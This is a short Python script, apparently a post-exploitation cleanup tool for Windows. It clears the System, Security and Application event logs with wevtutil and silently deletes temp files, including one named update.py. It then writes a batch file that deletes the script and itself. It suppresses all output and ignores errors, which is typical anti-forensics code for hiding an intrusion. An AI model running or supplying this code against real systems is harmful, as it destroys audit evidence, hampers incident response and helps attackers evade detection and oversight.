# cleanup.py
import os
import sys
import subprocess

def clear_logs():
    cmds = [
        "wevtutil cl System",
        "wevtutil cl Security",
        "wevtutil cl Application",
        f'del /f /q "{os.getenv("TEMP")}\\*.tmp"',
        f'del /f /q "{os.getenv("TEMP")}\\update.py"'
    ]
    for cmd in cmds:
        try:
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

def self_delete():
    batch = f'''@echo off
timeout /t 2 >nul
del /f /q "{sys.argv[0]}"
del /f /q "%TEMP%\\update.py"
start /b "" cmd /c del "%~f0"&exit /b
'''
    bat_path = os.path.join(os.getenv("TEMP"), "clean.bat")
    with open(bat_path, "w") as f:
        f.write(batch)
    os.system(f"start {bat_path}")

if __name__ == "__main__":
    clear_logs()
    self_delete()
